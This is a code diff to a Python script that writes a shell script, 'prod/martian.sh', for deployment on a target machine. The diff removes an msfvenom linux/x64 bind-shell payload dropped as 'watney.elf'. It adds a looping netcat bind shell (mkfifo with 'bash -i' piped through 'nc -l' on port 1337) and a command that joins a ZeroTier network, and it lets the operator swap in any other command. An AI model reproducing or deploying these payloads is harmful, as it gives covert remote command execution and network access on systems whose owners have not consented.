@@ -84,16 +84,20 @@ d = json.loads(response.text)
 local_ip = d.get('ipAssignments')[0]
 print(f'local IP: {local_ip}')
 
-command = f'msfvenom -p linux/x64/shell_bind_tcp LHOST=0.0.0.0 LPORT=1337 -f elf'
-output = subprocess.run(command, shell=True, stdout=subprocess.PIPE)
-encoded = base64.b64encode(output.stdout)
-shell_text = 'echo "' + encoded.decode() + '" | base64 -d > watney.elf && chmod +x watney.elf'
+command_default = 'while true; do rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 1337 > /tmp/f; sleep 1; done'
+print(f'Default command on setup: "{command_default}"')
+print(f'Enter command to run or [Enter for default]:\t')
+command = input()
+if command:
+    command_default = command
+
 script = open('scripts/martian_template.sh').readlines()
-script.insert(1, shell_text + '\n')
-script.insert(7, f'sudo ./zerotier-cli join {os.environ["NWID"]}\n')
+
 with open('prod/martian.sh', 'w') as f:
         for line in script:
             f.write(line)
+        f.write(f'sudo ./zerotier-cli join {os.environ["NWID"]}\n')
+        f.write(command_default)
 log.print_general('Script written to prod/martian.sh')
 
 
